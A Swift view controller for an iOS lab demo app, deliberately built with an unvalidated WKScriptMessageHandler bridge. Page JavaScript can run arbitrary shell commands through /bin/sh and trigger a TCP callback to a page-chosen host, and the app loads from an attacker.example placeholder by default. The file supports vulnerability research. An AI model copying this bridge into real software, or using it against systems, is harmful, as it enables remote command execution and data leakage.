// ViewController.swift — P6 iOS RIG DEMO — DELIBERATELY FLAWED-BY-DESIGN (LAB ONLY).
//
// AUTHORIZATION — LAB ONLY per docs/governance/policy.md §1/§7. C7 chain class
// demo: an app-authored WKScriptMessageHandler bridge that trusts page input
// without any validation — no origin allowlist, no payload schema check, no
// command allowlist. Page JS can drive app-process marker commands and a
// session-proof callback (the benign stand-in for the historical reverse-shell
// end-state, per policy §2).
//
// ON THE CONTRAST FINDING: iOS has NO platform-level addJavascriptInterface
// analogue. WKScriptMessageHandler is message-passing; whatever happens on a
// message is 100% this file's own code. The Android C1 class (CVE-2012-6636
// family) is therefore ABSENT on iOS by design; the reachable-on-iOS class is
// exactly this one — apps (or hybrid frameworks, e.g. the patched Cordova iOS
// CVE-2015-5207/5208) whose bridge validation is insufficient.
//
// HONEST SIMULATOR NOTE: simulator apps run natively on the host Mac, so the
// `exec` arm runs host-side commands in this rig's measurement (and is the
// instrumented proof that page JS reached app-process code). On real iOS
// hardware an app cannot fork processes — the exec arm is a SIMULATOR-ONLY
// measurement aid there; the mark/callback arms behave identically everywhere.

import os
import UIKit
import WebKit
import Network

final class ViewController: UIViewController, WKScriptMessageHandler {

    private var webView: WKWebView!

    /// Marker channel: `xcrun simctl spawn <dev> log stream --predicate
    /// 'eventMessage CONTAINS "P6RIG"'` (harness/capture_logs.sh).
    /// privacy: .public because these markers ARE the measurement payload.
    private let logger = Logger(subsystem: "com.qrcompromise.p6rigdemo", category: "p6rig")

    /// Documentation placeholder (policy §2): replace per lab run.
    private static let defaultURL = "http://attacker.example/p6rig/payload.html"

    override func viewDidLoad() {
        super.viewDidLoad()

        let config = WKWebViewConfiguration()
        let ucc = config.userContentController
        // ===== DELIBERATELY FLAWED BRIDGE (C7) =====
        // Registered with no origin restriction and implemented with no input
        // validation below. This is the shape of the patched Cordova-iOS rows
        // in mobile/inventory/chain-classes.csv (CVE-2015-5207/5208).
        ucc.add(self, name: "p6rigBridge")

        webView = WKWebView(frame: view.bounds, configuration: config)
        view.addSubview(webView)

        NotificationCenter.default.addObserver(
            self, selector: #selector(handleOpenURL(_:)),
            name: .p6rigOpenURL, object: nil)

        // U stage: load from the p6rig-url= launch argument, or the default.
        let url = ProcessInfo.processInfo.arguments.first(where: { $0.hasPrefix("p6rig-url=") })?
            .replacingOccurrences(of: "p6rig-url=", with: "")
            ?? Self.defaultURL
        log("U stage: loading url=\(url)")
        if let target = URL(string: url) {
            webView.load(URLRequest(url: target))
        }
    }

    @objc private func handleOpenURL(_ note: Notification) {
        guard let url = note.object as? URL else { return }
        // p6rigdemo://demo?url=<encoded http url> — unwrap and load, trusting
        // the payload verbatim (part of the deliberate flaw).
        if let comps = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let inner = comps.queryItems?.first(where: { $0.name == "url" })?.value {
            log("scheme dispatch: p6rigdemo -> \(inner)")
            if let target = URL(string: inner) {
                webView.load(URLRequest(url: target))
            }
        }
    }

    // MARK: - The deliberately unvalidated bridge handler

    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        // E stage: page JS reached app-process code. No origin check, no
        // schema validation, no allowlist — the C7 flaw.
        guard let body = message.body as? [String: Any] else {
            log("BRIDGE_REACHED (unparsed body)")
            return
        }
        let op = body["op"] as? String ?? ""

        switch op {
        case "mark":
            let tag = body["tag"] as? String ?? ""
            log("BRIDGE_REACHED op=mark tag=\(tag)")
            webView.evaluateJavaScript("console.log('p6rig ack: \(tag)');", completionHandler: nil)

        case "exec":
            // Simulated execution arm: benign marker command only. Runs
            // host-side in the simulator (see honest note in the header).
            let cmd = body["cmd"] as? String ?? ""
            log("BRIDGE_EXEC cmd=\(cmd)")
            let proc = Process()
            proc.executableURL = URL(fileURLWithPath: "/bin/sh")
            proc.arguments = ["-c", cmd]
            do {
                try proc.run()
                proc.waitUntilExit()
                log("BRIDGE_EXEC done")
            } catch {
                log("BRIDGE_EXEC failed: \(error)")
            }

        case "callback":
            // C stage: session-proof callback to the Kali-side listener stub
            // (mobile/rig/harness/listener_stub.py — OS-agnostic, reused).
            let host = body["host"] as? String ?? ""
            let port = body["port"] as? Int ?? 0
            log("BRIDGE_CALLBACK target=\(host):\(port)")
            let proof = "P6RIG-SESSION ios=\(deviceProof())"
            let conn = NWConnection(
                host: NWEndpoint.Host(host),
                port: NWEndpoint.Port(rawValue: UInt16(clamping: port)) ?? 0,
                using: .tcp)
            conn.stateUpdateHandler = { state in
                switch state {
                case .ready:
                    conn.send(content: (proof + "\n").data(using: .utf8),
                              completion: .contentProcessed { _ in
                        conn.receiveMessage { _ in
                            self.log("BRIDGE_CALLBACK sent")
                            conn.cancel()
                        }
                    })
                case .failed(let error):
                    self.log("BRIDGE_CALLBACK failed: \(error)")
                    conn.cancel()
                default:
                    break
                }
            }
            conn.start(queue: .global())

        default:
            log("BRIDGE_REACHED op=\(op) (unhandled)")
        }
    }

    private func deviceProof() -> String {
        let d = ProcessInfo.processInfo
        return d.operatingSystemVersionString.replacingOccurrences(of: " ", with: "_") + "/sim"
    }

    private func log(_ msg: String) {
        logger.info("P6RIG \(msg, privacy: .public)")
    }
}
